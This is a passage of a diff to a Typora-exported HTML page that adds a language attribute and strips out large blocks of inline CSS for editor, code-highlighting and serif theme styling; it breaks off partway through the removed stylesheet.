@@ -1,953 +1,571 @@
 <!doctype html>
-<html>
+<html lang="en">
 <head>
-<meta charset='UTF-8'><meta name='viewport' content='width=device-width initial-scale=1'><style type='text/css'>html {overflow-x: initial !important;}</style>
-<style type='text/css'  id="style-base">:root { --bg-color: #ffffff; --text-color: #333333; --select-text-bg-color: #B5D6FC; --select-text-font-color: auto; --monospace: "Lucida Console",Consolas,"Courier",monospace; --title-bar-height: 20px; }
-.mac-os-11 { --title-bar-height: 28px; }
-html { font-size: 14px; background-color: var(--bg-color); color: var(--text-color); font-family: "Helvetica Neue", Helvetica, Arial, "Segoe UI Emoji", "SF Pro", sans-serif; -webkit-font-smoothing: antialiased; }
-h1, h2, h3, h4, h5 { white-space: pre-wrap; }
-body { margin: 0px; padding: 0px; height: auto; inset: 0px; font-size: 1rem; line-height: 1.42857; overflow-x: hidden; background: inherit; }
-iframe { margin: auto; }
-a.url { word-break: break-all; }
-a:active, a:hover { outline: 0px; }
-.in-text-selection, ::selection { text-shadow: none; background: var(--select-text-bg-color); color: var(--select-text-font-color); }
-#write { margin: 0px auto; height: auto; width: inherit; word-break: normal; overflow-wrap: break-word; position: relative; white-space: normal; overflow-x: visible; padding-top: 36px; }
-#write.first-line-indent p { text-indent: 2em; }
-#write.first-line-indent li p, #write.first-line-indent p *, #write.first-line-indent svg * { text-indent: 0px; }
-#write.first-line-indent li { margin-left: 2em; }
-.for-image #write { padding-left: 8px; padding-right: 8px; }
-body.typora-export { padding-left: 30px; padding-right: 30px; }
-.typora-export .footnote-line, .typora-export li, .typora-export p { white-space: pre-wrap; }
-.typora-export .task-list-item input { pointer-events: none; }
-@media screen and (max-width: 500px) {
-  body.typora-export { padding-left: 0px; padding-right: 0px; }
-  #write { padding-left: 20px; padding-right: 20px; }
-}
-#write li > figure:last-child { margin-bottom: 0.5rem; }
-#write ol, #write ul { position: relative; }
-img { max-width: 100%; vertical-align: middle; image-orientation: from-image; }
-button, input, select, textarea { color: inherit; font: inherit; }
-input[type="checkbox"], input[type="radio"] { line-height: normal; padding: 0px; }
-*, ::after, ::before { box-sizing: border-box; }
-#write h1, #write h2, #write h3, #write h4, #write h5, #write h6, #write p, #write pre { width: inherit; position: relative; }
-#write svg h1, #write svg h2, #write svg h3, #write svg h4, #write svg h5, #write svg h6, #write svg p { position: static; }
-.nodeLabel p { padding-right: 2px; padding-left: 2px; }
-.typora-export .nodeLabel p { padding-right: 0px; padding-left: 0px; }
-foreignobject { overflow: visible; }
-p { line-height: inherit; }
-h1, h2, h3, h4, h5, h6 { break-after: avoid-page; break-inside: avoid; orphans: 4; }
-p { orphans: 4; }
-li p { orphans: 1; }
-h1 { font-size: 2rem; }
-h2 { font-size: 1.8rem; }
-h3 { font-size: 1.6rem; }
-h4 { font-size: 1.4rem; }
-h5 { font-size: 1.2rem; }
-h6 { font-size: 1rem; }
-.md-math-block, .md-rawblock, h1, h2, h3, h4, h5, h6, p { margin-top: 1rem; margin-bottom: 1rem; }
-.hidden { display: none; }
-.md-blockmeta { color: rgb(204, 204, 204); font-weight: 700; font-style: italic; }
-a { cursor: pointer; }
-sup.md-footnote { padding: 2px 4px; background-color: rgba(238, 238, 238, 0.7); color: rgb(85, 85, 85); border-radius: 4px; cursor: pointer; }
-sup.md-footnote a, sup.md-footnote a:hover { color: inherit; text-transform: inherit; text-decoration: inherit; }
-#write input[type="checkbox"] { cursor: pointer; width: inherit; height: inherit; }
-figure { overflow-x: auto; margin: 1.2em 0px; max-width: calc(100% + 16px); padding: 0px; }
-figure > table { margin: 0px; }
-thead, tr { break-inside: avoid; break-after: auto; }
-thead { display: table-header-group; }
-table { border-collapse: collapse; border-spacing: 0px; width: 100%; overflow: auto; break-inside: auto; text-align: left; }
-table.md-table td { min-width: 32px; }
-.CodeMirror-gutters { border-right: 0px; background-color: inherit; }
-.CodeMirror-linenumber { user-select: none; }
-.CodeMirror { text-align: left; }
-.CodeMirror-placeholder { opacity: 0.3; }
-.CodeMirror pre { padding: 0px 4px; }
-.CodeMirror-lines { padding: 0px; }
-div.hr:focus { cursor: none; }
-#write pre { white-space: pre-wrap; }
-#write.fences-no-line-wrapping pre { white-space: pre; }
-#write pre.ty-contain-cm { white-space: normal; }
-.CodeMirror-gutters { margin-right: 4px; }
-.md-fences { font-size: 0.9rem; display: block; break-inside: avoid; text-align: left; overflow: visible; white-space: pre; background: inherit; position: relative !important; }
-.md-fences-adv-panel { width: 100%; margin-top: 10px; text-align: center; padding-top: 0px; padding-bottom: 8px; overflow-x: auto; }
-#write .md-fences.mock-cm { white-space: pre-wrap; }
-.md-fences.md-fences-with-lineno { padding-left: 0px; }
-#write.fences-no-line-wrapping .md-fences.mock-cm { white-space: pre; overflow-x: auto; }
-.md-fences.mock-cm.md-fences-with-lineno { padding-left: 8px; }
-.CodeMirror-line, twitterwidget { break-inside: avoid; }
-svg { break-inside: avoid; }
-.footnotes { opacity: 0.8; font-size: 0.9rem; margin-top: 1em; margin-bottom: 1em; }
-.footnotes + .footnotes { margin-top: 0px; }
-.md-reset { margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: top; background: 0px 0px; text-decoration: none; text-shadow: none; float: none; position: static; width: auto; height: auto; white-space: nowrap; cursor: inherit; -webkit-tap-highlight-color: transparent; line-height: normal; font-weight: 400; text-align: left; box-sizing: content-box; direction: ltr; }
-li div { padding-top: 0px; }
-blockquote { margin: 1rem 0px; }
-li .mathjax-block, li p { margin: 0.5rem 0px; }
-li blockquote { margin: 1rem 0px; }
-li { margin: 0px; position: relative; }
-blockquote > :last-child { margin-bottom: 0px; }
-blockquote > :first-child, li > :first-child { margin-top: 0px; }
-.footnotes-area { color: rgb(136, 136, 136); margin-top: 0.714rem; padding-bottom: 0.143rem; white-space: normal; }
-#write .footnote-line { white-space: pre-wrap; }
-@media print {
-  body, html { border: 1px solid transparent; height: 99%; break-after: avoid; break-before: avoid; font-variant-ligatures: no-common-ligatures; }
-  #write { margin-top: 0px; border-color: transparent !important; padding-top: 0px !important; padding-bottom: 0px !important; }
-  .typora-export * { -webkit-print-color-adjust: exact; }
-  .typora-export #write { break-after: avoid; }
-  .typora-export #write::after { height: 0px; }
-  .is-mac table { break-inside: avoid; }
-  #write > p:nth-child(1) { margin-top: 0px; }
-  .typora-export-show-outline .typora-export-sidebar { display: none; }
-  figure { overflow-x: visible; }
-}
-.footnote-line { margin-top: 0.714em; font-size: 0.7em; }
-a img, img a { cursor: pointer; }
-pre.md-meta-block { font-size: 0.8rem; min-height: 0.8rem; white-space: pre-wrap; background: rgb(204, 204, 204); display: block; overflow-x: hidden; }
-p > .md-image:only-child:not(.md-img-error) img, p > img:only-child { display: block; margin: auto; }
-#write.first-line-indent p > .md-image:only-child:not(.md-img-error) img { left: -2em; position: relative; }
-p > .md-image:only-child { display: inline-block; width: 100%; }
-#write .MathJax_Display { margin: 0.8em 0px 0px; }
-.md-math-block { width: 100%; }
-.md-math-block:not(:empty)::after { display: none; }
-.MathJax_ref { fill: currentcolor; }
-[contenteditable="true"]:active, [contenteditable="true"]:focus, [contenteditable="false"]:active, [contenteditable="false"]:focus { outline: 0px; box-shadow: none; }
-.md-task-list-item { position: relative; list-style-type: none; }
-.task-list-item.md-task-list-item { padding-left: 0px; }
-.md-task-list-item > input { position: absolute; top: 0px; left: 0px; margin-left: -1.2em; margin-top: calc(1em - 10px); border: none; }
-.math { font-size: 1rem; }
-.md-toc { min-height: 3.58rem; position: relative; font-size: 0.9rem; border-radius: 10px; }
-.md-toc-content { position: relative; margin-left: 0px; }
-.md-toc-content::after, .md-toc::after { display: none; }
-.md-toc-item { display: block; color: rgb(65, 131, 196); }
-.md-toc-item a { text-decoration: none; }
-.md-toc-inner:hover { text-decoration: underline; }
-.md-toc-inner { display: inline-block; cursor: pointer; }
-.md-toc-h1 .md-toc-inner { margin-left: 0px; font-weight: 700; }
-.md-toc-h2 .md-toc-inner { margin-left: 2em; }
-.md-toc-h3 .md-toc-inner { margin-left: 4em; }
-.md-toc-h4 .md-toc-inner { margin-left: 6em; }
-.md-toc-h5 .md-toc-inner { margin-left: 8em; }
-.md-toc-h6 .md-toc-inner { margin-left: 10em; }
-@media screen and (max-width: 48em) {
-  .md-toc-h3 .md-toc-inner { margin-left: 3.5em; }
-  .md-toc-h4 .md-toc-inner { margin-left: 5em; }
-  .md-toc-h5 .md-toc-inner { margin-left: 6.5em; }
-  .md-toc-h6 .md-toc-inner { margin-left: 8em; }
-}
-a.md-toc-inner { font-size: inherit; font-style: inherit; font-weight: inherit; line-height: inherit; }
-.footnote-line a:not(.reversefootnote) { color: inherit; }
-.reversefootnote { font-family: ui-monospace, sans-serif; }
-.md-attr { display: none; }
-.md-fn-count::after { content: "."; }
-code, pre, samp, tt { font-family: var(--monospace); }
-kbd { margin: 0px 0.1em; padding: 0.1em 0.6em; font-size: 0.8em; color: rgb(36, 39, 41); background: rgb(255, 255, 255); border: 1px solid rgb(173, 179, 185); border-radius: 3px; box-shadow: rgba(12, 13, 14, 0.2) 0px 1px 0px, rgb(255, 255, 255) 0px 0px 0px 2px inset; white-space: nowrap; vertical-align: middle; }
-.md-comment { color: rgb(162, 127, 3); opacity: 0.6; font-family: var(--monospace); }
-code { text-align: left; vertical-align: initial; }
-a.md-print-anchor { white-space: pre !important; border-width: initial !important; border-style: none !important; border-color: initial !important; display: inline-block !important; position: absolute !important; width: 1px !important; right: 0px !important; outline: 0px !important; background: 0px 0px !important; text-decoration: initial !important; text-shadow: initial !important; }
-.os-windows.monocolor-emoji .md-emoji { font-family: "Segoe UI Symbol", sans-serif; }
-.md-diagram-panel > svg { max-width: 100%; }
-[lang="flow"] svg, [lang="mermaid"] svg { max-width: 100%; height: auto; }
-[lang="mermaid"] .node text { font-size: 1rem; }
-table tr th { border-bottom: 0px; }
-video { max-width: 100%; display: block; margin: 0px auto; }
-iframe { max-width: 100%; width: 100%; border: none; }
-.highlight td, .highlight tr { border: 0px; }
-mark { background: rgb(255, 255, 0); color: rgb(0, 0, 0); }
-.md-html-inline .md-plain, .md-html-inline strong, mark .md-inline-math, mark strong { color: inherit; }
-.md-expand mark .md-meta { opacity: 0.3 !important; }
-mark .md-meta { color: rgb(0, 0, 0); }
-@media print {
-  .typora-export h1, .typora-export h2, .typora-export h3, .typora-export h4, .typora-export h5, .typora-export h6 { break-inside: avoid; }
-}
-.md-diagram-panel .messageText { stroke: none !important; }
-.md-diagram-panel .start-state { fill: var(--node-fill); }
-.md-diagram-panel .edgeLabel rect { opacity: 1 !important; }
-.md-fences.md-fences-math { font-size: 1em; }
-.md-fences-advanced:not(.md-focus) { padding: 0px; white-space: nowrap; border: 0px; }
-.md-fences-advanced:not(.md-focus) { background: inherit; }
-.mermaid-svg { margin: auto; }
-.typora-export-show-outline .typora-export-content { max-width: 1440px; margin: auto; display: flex; flex-direction: row; }
-.typora-export-sidebar { width: 300px; font-size: 0.8rem; margin-top: 80px; margin-right: 18px; }
-.typora-export-show-outline #write { --webkit-flex: 2; flex: 2 1 0%; }
-.typora-export-sidebar .outline-content { position: fixed; top: 0px; max-height: 100%; overflow: hidden auto; padding-bottom: 30px; padding-top: 60px; width: 300px; }
-@media screen and (max-width: 1024px) {
-  .typora-export-sidebar, .typora-export-sidebar .outline-content { width: 240px; }
-}
-@media screen and (max-width: 800px) {
-  .typora-export-sidebar { display: none; }
-}
-.outline-content li, .outline-content ul { margin-left: 0px; margin-right: 0px; padding-left: 0px; padding-right: 0px; list-style: none; overflow-wrap: anywhere; }
-.outline-content ul { margin-top: 0px; margin-bottom: 0px; }
-.outline-content strong { font-weight: 400; }
-.outline-expander { width: 1rem; height: 1.42857rem; position: relative; display: table-cell; vertical-align: middle; cursor: pointer; padding-left: 4px; }
-.outline-expander::before { content: ""; position: relative; font-family: Ionicons; display: inline-block; font-size: 8px; vertical-align: middle; }
-.outline-item { padding-top: 3px; padding-bottom: 3px; cursor: pointer; }
-.outline-expander:hover::before { content: ""; }
-.outline-h1 > .outline-item { padding-left: 0px; }
-.outline-h2 > .outline-item { padding-left: 1em; }
-.outline-h3 > .outline-item { padding-left: 2em; }
-.outline-h4 > .outline-item { padding-left: 3em; }
-.outline-h5 > .outline-item { padding-left: 4em; }
-.outline-h6 > .outline-item { padding-left: 5em; }
-.outline-label { cursor: pointer; display: table-cell; vertical-align: middle; text-decoration: none; color: inherit; }
-.outline-label:hover { text-decoration: underline; }
-.outline-item:hover { border-color: rgb(245, 245, 245); background-color: var(--item-hover-bg-color); }
-.outline-item:hover { margin-left: -28px; margin-right: -28px; border-left: 28px solid transparent; border-right: 28px solid transparent; }
-.outline-item-single .outline-expander::before, .outline-item-single .outline-expander:hover::before { display: none; }
-.outline-item-open > .outline-item > .outline-expander::before { content: ""; }
-.outline-children { display: none; }
-.info-panel-tab-wrapper { display: none; }
-.outline-item-open > .outline-children { display: block; }
-.typora-export .outline-item { padding-top: 1px; padding-bottom: 1px; }
-.typora-export .outline-item:hover { margin-right: -8px; border-right: 8px solid transparent; }
-.typora-export .outline-expander::before { content: "+"; font-family: inherit; top: -1px; }
-.typora-export .outline-expander:hover::before, .typora-export .outline-item-open > .outline-item > .outline-expander::before { content: "−"; }
-.typora-export-collapse-outline .outline-children { display: none; }
-.typora-export-collapse-outline .outline-item-open > .outline-children, .typora-export-no-collapse-outline .outline-children { display: block; }
-.typora-export-no-collapse-outline .outline-expander::before { content: "" !important; }
-.typora-export-show-outline .outline-item-active > .outline-item .outline-label { font-weight: 700; }
-.md-inline-math-container mjx-container { zoom: 0.95; }
-mjx-container { break-inside: avoid; }
-.md-alert.md-alert-note { border-left-color: rgb(9, 105, 218); }
-.md-alert.md-alert-important { border-left-color: rgb(130, 80, 223); }
-.md-alert.md-alert-warning { border-left-color: rgb(154, 103, 0); }
-.md-alert.md-alert-tip { border-left-color: rgb(31, 136, 61); }
-.md-alert.md-alert-caution { border-left-color: rgb(207, 34, 46); }
-.md-alert { padding: 0px 1em; margin-bottom: 16px; color: inherit; border-left: 0.25em solid rgb(0, 0, 0); }
-.md-alert-text-note { color: rgb(9, 105, 218); }
-.md-alert-text-important { color: rgb(130, 80, 223); }
-.md-alert-text-warning { color: rgb(154, 103, 0); }
-.md-alert-text-tip { color: rgb(31, 136, 61); }
-.md-alert-text-caution { color: rgb(207, 34, 46); }
-.md-alert-text { font-size: 0.9rem; font-weight: 700; }
-.md-alert-text svg { fill: currentcolor; position: relative; top: 0.125em; margin-right: 1ch; overflow: visible; }
-.md-alert-text-container::after { content: attr(data-text); text-transform: capitalize; pointer-events: none; margin-right: 1ch; }
-
-</style>
-<style type='text/css'  id="style-codemirror">.CodeMirror { height: auto; }
-.CodeMirror.cm-s-inner { background: inherit; }
-.CodeMirror-scroll { overflow: auto hidden; z-index: 3; }
-.CodeMirror-gutter-filler, .CodeMirror-scrollbar-filler { background-color: rgb(255, 255, 255); }
-.CodeMirror-gutters { border-right: 1px solid rgb(221, 221, 221); background: inherit; white-space: nowrap; }
-.CodeMirror-linenumber { padding: 0px 3px 0px 5px; text-align: right; color: rgb(153, 153, 153); }
-.cm-s-inner .cm-keyword { color: rgb(119, 0, 136); }
-.cm-s-inner .cm-atom, .cm-s-inner.cm-atom { color: rgb(34, 17, 153); }
-.cm-s-inner .cm-number { color: rgb(17, 102, 68); }
-.cm-s-inner .cm-def { color: rgb(0, 0, 255); }
-.cm-s-inner .cm-variable { color: rgb(0, 0, 0); }
-.cm-s-inner .cm-variable-2 { color: rgb(0, 85, 170); }
-.cm-s-inner .cm-variable-3 { color: rgb(0, 136, 85); }
-.cm-s-inner .cm-string { color: rgb(170, 17, 17); }
-.cm-s-inner .cm-property { color: rgb(0, 0, 0); }
-.cm-s-inner .cm-operator { color: rgb(152, 26, 26); }
-.cm-s-inner .cm-comment, .cm-s-inner.cm-comment { color: rgb(170, 85, 0); }
-.cm-s-inner .cm-string-2 { color: rgb(255, 85, 0); }
-.cm-s-inner .cm-meta { color: rgb(85, 85, 85); }
-.cm-s-inner .cm-qualifier { color: rgb(85, 85, 85); }
-.cm-s-inner .cm-builtin { color: rgb(51, 0, 170); }
-.cm-s-inner .cm-bracket { color: rgb(153, 153, 119); }
-.cm-s-inner .cm-tag { color: rgb(17, 119, 0); }
-.cm-s-inner .cm-attribute { color: rgb(0, 0, 204); }
-.cm-s-inner .cm-header, .cm-s-inner.cm-header { color: rgb(0, 0, 255); }
-.cm-s-inner .cm-quote, .cm-s-inner.cm-quote { color: rgb(0, 153, 0); }
-.cm-s-inner .cm-hr, .cm-s-inner.cm-hr { color: rgb(153, 153, 153); }
-.cm-s-inner .cm-link, .cm-s-inner.cm-link { color: rgb(0, 0, 204); }
-.cm-negative { color: rgb(221, 68, 68); }
-.cm-positive { color: rgb(34, 153, 34); }
-.cm-header, .cm-strong { font-weight: 700; }
-.cm-del { text-decoration: line-through; }
-.cm-em { font-style: italic; }
-.cm-link { text-decoration: underline; }
-.cm-error { color: red; }
-.cm-invalidchar { color: red; }
-.cm-constant { color: rgb(38, 139, 210); }
-.cm-defined { color: rgb(181, 137, 0); }
-div.CodeMirror span.CodeMirror-matchingbracket { color: rgb(0, 255, 0); }
-div.CodeMirror span.CodeMirror-nonmatchingbracket { color: rgb(255, 34, 34); }
-.cm-s-inner .CodeMirror-activeline-background { background: inherit; }
-.CodeMirror { position: relative; overflow: hidden; }
-.CodeMirror-scroll { height: 100%; outline: 0px; position: relative; box-sizing: content-box; background: inherit; }
-.CodeMirror-sizer { position: relative; }
-.CodeMirror-gutter-filler, .CodeMirror-hscrollbar, .CodeMirror-scrollbar-filler, .CodeMirror-vscrollbar { position: absolute; z-index: 6; display: none; outline: 0px; }
-.CodeMirror-vscrollbar { right: 0px; top: 0px; overflow: hidden; }
-.CodeMirror-hscrollbar { bottom: 0px; left: 0px; overflow: auto hidden; }
-.CodeMirror-scrollbar-filler { right: 0px; bottom: 0px; }
-.CodeMirror-gutter-filler { left: 0px; bottom: 0px; }
-.CodeMirror-gutters { position: absolute; left: 0px; top: 0px; padding-bottom: 10px; z-index: 3; overflow-y: hidden; }
-.CodeMirror-gutter { white-space: normal; height: 100%; box-sizing: content-box; padding-bottom: 30px; margin-bottom: -32px; display: inline-block; }
-.CodeMirror-gutter-wrapper { position: absolute; z-index: 4; background: 0px 0px !important; border: none !important; }
-.CodeMirror-gutter-background { position: absolute; top: 0px; bottom: 0px; z-index: 4; }
-.CodeMirror-gutter-elt { position: absolute; cursor: default; z-index: 4; }
-.CodeMirror-lines { cursor: text; }
-.CodeMirror pre { border-radius: 0px; border-width: 0px; background: 0px 0px; font-family: inherit; font-size: inherit; margin: 0px; white-space: pre; overflow-wrap: normal; color: inherit; z-index: 2; position: relative; overflow: visible; }
-.CodeMirror-wrap pre { overflow-wrap: break-word; white-space: pre-wrap; word-break: normal; }
-.CodeMirror-code pre { border-right: 30px solid transparent; width: fit-content; }
-.CodeMirror-wrap .CodeMirror-code pre { border-right: none; width: auto; }
-.CodeMirror-linebackground { position: absolute; inset: 0px; z-index: 0; }
-.CodeMirror-linewidget { position: relative; z-index: 2; overflow: auto; }
-.CodeMirror-wrap .CodeMirror-scroll { overflow-x: hidden; }
-.CodeMirror-measure { position: absolute; width: 100%; height: 0px; overflow: hidden; visibility: hidden; }
-.CodeMirror-measure pre { position: static; }
-.CodeMirror div.CodeMirror-cursor { position: absolute; visibility: hidden; border-right: none; width: 0px; }
-.CodeMirror div.CodeMirror-cursor { visibility: hidden; }
-.CodeMirror-focused div.CodeMirror-cursor { visibility: inherit; }
-.cm-searching { background: rgba(255, 255, 0, 0.4); }
-span.cm-underlined { text-decoration: underline; }
-span.cm-strikethrough { text-decoration: line-through; }
-.cm-tw-syntaxerror { color: rgb(255, 255, 255); background-color: rgb(153, 0, 0); }
-.cm-tw-deleted { text-decoration: line-through; }
-.cm-tw-header5 { font-weight: 700; }
-.cm-tw-listitem:first-child { padding-left: 10px; }
-.cm-tw-box { border-style: solid; border-right-width: 1px; border-bottom-width: 1px; border-left-width: 1px; border-color: inherit; border-top-width: 0px !important; }
-.cm-tw-underline { text-decoration: underline; }
-@media print {
-  .CodeMirror div.CodeMirror-cursor { visibility: hidden; }
-}
-
-</style>
-<link rel='stylesheet' href='https://fonts.loli.net/css?family=PT+Serif:400,400italic,700,700italic&amp;subset=latin,cyrillic-ext,cyrillic,latin-ext' type='text/css' />
-<style type='text/css'  id="style-theme_css">/* meyer reset -- http://meyerweb.com/eric/tools/css/reset/ , v2.0 | 20110126 | License: none (public domain) */
-
-@include-when-export url(https://fonts.loli.net/css?family=PT+Serif:400,400italic,700,700italic&subset=latin,cyrillic-ext,cyrillic,latin-ext);
-
-/* =========== */
-
-/* pt-serif-regular - latin */
-/* pt-serif-italic - latin */
-/* pt-serif-700 - latin */
-/* pt-serif-700italic - latin */
-:root {
-  --active-file-bg-color: #dadada;
-  --active-file-bg-color: rgba(32, 43, 51, 0.63);
-  --active-file-text-color: white;
-  --bg-color: #f3f2ee;
-  --text-color: #1f0909;
-  --control-text-color: #444;
-  --rawblock-edit-panel-bd: #e5e5e5;
-
-  --select-text-bg-color: rgba(32, 43, 51, 0.63);
-  --select-text-font-color: white;
-}
-
-pre {
-  --select-text-bg-color: #36284e;
-  --select-text-font-color: #fff;
-}
-
-html {
-  font-size: 16px;
-  -webkit-font-smoothing: antialiased;
-}
-
-html,
-body {
-  background-color: #f3f2ee;
-  font-family: "PT Serif", "Times New Roman", Times, serif;
-  color: #1f0909;
-  line-height: 1.5em;
-}
-
-/*#write {
-	overflow-x: auto;
-    max-width: initial;
-	padding-left: calc(50% - 17em);
-    padding-right: calc(50% - 17em);
-}
-
-@media (max-width: 36em) {
- 	#write {
- 		padding-left: 1em;
-    	padding-right: 1em;
- 	}
-}*/
-
-/* #write {
-  max-width: 40em;
-} */
-
-/* @media only screen and (min-width: 1400px) {
-  #write {
-    max-width: 914px;
-  }
-} */
-
-/* 강제 적용 버전 */
-#write {
-  max-width: 900px !important; /* 숫자를 더 키워보세요 */
-  width: 90% !important;
-}
-
-@media only screen and (min-width: 1400px) {
-  #write {
-    max-width: 1400px !important;
-  }
-}
-
-ol li {
-  list-style-type: decimal;
-  list-style-position: outside;
-}
-ul li {
-  list-style-type: disc;
-  list-style-position: outside;
-}
-
-ol,
-ul {
-  list-style: none;
-}
-
-blockquote,
-q {
-  quotes: none;
-}
-blockquote:before,
-blockquote:after,
-q:before,
-q:after {
-  content: "";
-  content: none;
-}
-table {
-  border-collapse: collapse;
-  border-spacing: 0;
-}
-/* styles */
-
-/* ====== */
-
-/* headings */
-
-h1,
-h2,
-h3,
-h4,
-h5,
-h6 {
-  font-weight: bold;
-}
-h1 {
-  font-size: 1.875em;
-  /*30 / 16*/
-  line-height: 1.6em;
-  /* 48 / 30*/
-  margin-top: 2em;
-}
-h2,
-h3 {
-  font-size: 1.3125em;
-  /*21 / 16*/
-  line-height: 1.15;
-  /*24 / 21*/
-  margin-top: 2.285714em;
-  /*48 / 21*/
-  margin-bottom: 1.15em;
-  /*24 / 21*/
-}
-h3 {
-  font-weight: normal;
-}
-h4 {
-  font-size: 1.125em;
-  /*18 / 16*/
-  margin-top: 2.67em;
-  /*48 / 18*/
-}
-h5,
-h6 {
-  font-size: 1em;
-  /*16*/
-}
-h1 {
-  border-bottom: 1px solid;
-  margin-bottom: 1.875em;
-  padding-bottom: 0.8125em;
-}
-/* links */
-
-a {
-  text-decoration: none;
-  color: #065588;
-}
-a:hover,
-a:active {
-  text-decoration: underline;
-}
-/* block spacing */
-
-p,
-blockquote,
-.md-fences {
-  margin-bottom: 1.5em;
-}
-h1,
-h2,
-h3,
-h4,
-h5,
-h6 {
-  margin-bottom: 1.5em;
-}
-/* blockquote */
-
-blockquote {
-  font-style: italic;
-  border-left: 5px solid;
-  margin-left: 2em;
-  padding-left: 1em;
-}
-/* lists */
-
-ul,
-ol {
-  margin: 0 0 1.5em 1.5em;
-}
-/* tables */
-.md-meta,
-.md-before,
-.md-after {
-  color: #999;
-}
-
-table {
-  margin-bottom: 1.5em;
-  /*24 / 16*/
-  font-size: 1em;
-  /* width: 100%; */
-}
-thead th,
-tfoot th {
-  padding: 0.25em 0.25em 0.25em 0.4em;
-  text-transform: uppercase;
-}
-th {
-  text-align: left;
-}
-td {
-  vertical-align: top;
-  padding: 0.25em 0.25em 0.25em 0.4em;
-}
-
-code,
-.md-fences {
-  background-color: #dadada;
-}
-
-code {
-  padding-left: 2px;
-  padding-right: 2px;
-}
-
-.md-fences {
-  margin-left: 2em;
-  margin-bottom: 3em;
-  padding-left: 1ch;
-  padding-right: 1ch;
-  font-size: 0.8em;
-  margin-left: 0 !important;
-  width: 90% !important; /* 100%에서 95%로 살짝 줄임 */
-  max-width: 90% !important; /* 최대치 고정 */
-}
-
-pre,
-code,
-tt {
-  font-size: 0.875em;
-  line-height: 1.714285em;
-}
-/* some fixes */
-
-h1 {
-  line-height: 1.3em;
-  font-weight: normal;
-  margin-bottom: 0.5em;
-}
-
-p + ul,
-p + ol {
-  margin-top: 0.5em;
-}
-
-h3 + ul,
-h4 + ul,
-h5 + ul,
-h6 + ul,
-h3 + ol,
-h4 + ol,
-h5 + ol,
-h6 + ol {
-  margin-top: 0.5em;
-}
-
-li > ul,
-li > ol {
-  margin-top: inherit;
-  margin-bottom: 0;
-}
-
-li ol > li {
-  list-style-type: lower-alpha;
-}
-
-li li ol > li {
-  list-style-type: lower-roman;
-}
-
-h2,
-h3 {
-  margin-bottom: 0.75em;
-}
-hr {
-  border-top: none;
-  border-right: none;
-  border-bottom: 1px solid;
-  border-left: none;
-}
-h1 {
-  border-color: #c5c5c5;
-}
-blockquote {
-  border-color: #bababa;
-  color: #656565;
-}
-
-blockquote ul,
-blockquote ol {
-  margin-left: 0;
-}
-
-.ty-table-edit {
-  background-color: transparent;
-}
-thead {
-  background-color: #dadada;
-}
-tr:nth-child(even) {
-  background: #e8e7e7;
-}
-hr {
-  border-color: #c5c5c5;
-}
-.task-list {
-  padding-left: 1rem;
-}
-
-.md-task-list-item {
-  padding-left: 1.5rem;
-  list-style-type: none;
-}
-
-.md-task-list-item > input:before {
-  content: "\221A";
-  display: inline-block;
-  width: 1.25rem;
-  height: 1.6rem;
-  vertical-align: middle;
-  text-align: center;
-  color: #ddd;
-  background-color: #f3f2ee;
-}
-
-.md-task-list-item > input:checked:before,
-.md-task-list-item > input[checked]:before {
-  color: inherit;
-}
-
-#write pre.md-meta-block {
-  min-height: 1.875rem;
-  color: #555;
-  border: 0px;
-  background: transparent;
-  margin-top: -4px;
-  margin-left: 1em;
-  margin-top: 1em;
-}
-
-.md-image > .md-meta {
-  color: #9b5146;
-}
-
-.md-image > .md-meta {
-  font-family:
-    Menlo, "Ubuntu Mono", Consolas, "Courier New", "Microsoft Yahei",
-    "Hiragino Sans GB", "WenQuanYi Micro Hei", serif;
-}
-
-#write > h3.md-focus:before {
-  left: -1.5rem;
-  color: #999;
-  border-color: #999;
-}
-#write > h4.md-focus:before {
-  left: -1.5rem;
-  top: 0.25rem;
-  color: #999;
-  border-color: #999;
-}
-#write > h5.md-focus:before {
-  left: -1.5rem;
-  top: 0.3125rem;
-  color: #999;
-  border-color: #999;
-}
-#write > h6.md-focus:before {
-  left: -1.5rem;
-  top: 0.3125rem;
-  color: #999;
-  border-color: #999;
-}
-
-.md-toc:focus .md-toc-content {
-  margin-top: 19px;
-}
-
-.md-toc-content:empty:before {
-  color: #065588;
-}
-.md-toc-item {
-  color: #065588;
-}
-#write div.md-toc-tooltip {
-  background-color: #f3f2ee;
-}
-
-#typora-sidebar {
-  background-color: #f3f2ee;
-  -webkit-box-shadow: 0 6px 12px rgba(0, 0, 0, 0.375);
-  box-shadow: 0 6px 12px rgba(0, 0, 0, 0.375);
-}
-
-.pin-outline #typora-sidebar {
-  background: inherit;
-  box-shadow: none;
-  border-right: 1px dashed;
-}
-
-.pin-outline #typora-sidebar:hover .outline-title-wrapper {
-  border-left: 1px dashed;
-}
-
-.outline-item:hover {
-  background-color: #dadada;
-  border-left: 28px solid #dadada;
-  border-right: 18px solid #dadada;
-}
-
-.typora-node .outline-item:hover {
-  border-right: 28px solid #dadada;
-}
-
-.outline-expander:before {
-  content: "\f0da";
-  font-family: FontAwesome;
-  font-size: 14px;
-  top: 1px;
-}
-
-.outline-expander:hover:before,
-.outline-item-open > .outline-item > .outline-expander:before {
-  content: "\f0d7";
-}
-
-.modal-content {
-  background-color: #f3f2ee;
-}
-
-.auto-suggest-container ul li {
-  list-style-type: none;
-}
-
-/** UI for electron */
-
-.megamenu-menu,
-#top-titlebar,
-#top-titlebar *,
-.megamenu-content {
-  background: #f3f2ee;
-  color: #1f0909;
-}
-
-.megamenu-menu-header {
-  border-bottom: 1px dashed #202b33;
-}
-
-.megamenu-menu {
-  box-shadow: none;
-  border-right: 1px dashed;
-}
-
-header,
-.context-menu,
-.megamenu-content,
-footer {
-  font-family: "PT Serif", "Times New Roman", Times, serif;
-  color: #1f0909;
-}
-
-#megamenu-back-btn {
-  color: #1f0909;
-  border-color: #1f0909;
-}
-
-.megamenu-menu-header #megamenu-menu-header-title:before {
-  color: #1f0909;
-}
-
-.megamenu-menu-list li a:hover,
-.megamenu-menu-list li a.active {
-  color: inherit;
-  background-color: #e8e7df;
-}
-
-.long-btn:hover {
-  background-color: #e8e7df;
-}
-
-#recent-file-panel tbody tr:nth-child(2n-1) {
-  background-color: transparent !important;
-}
-
-.megamenu-menu-panel tbody tr:hover td:nth-child(2) {
-  color: inherit;
-}
-
-.megamenu-menu-panel .btn {
-  background-color: #d2d1d1;
-}
-
-.btn-default {
-  background-color: transparent;
-}
-
-.typora-sourceview-on #toggle-sourceview-btn,
-.ty-show-word-count #footer-word-count {
-  background: #c7c5c5;
-}
-
-#typora-quick-open {
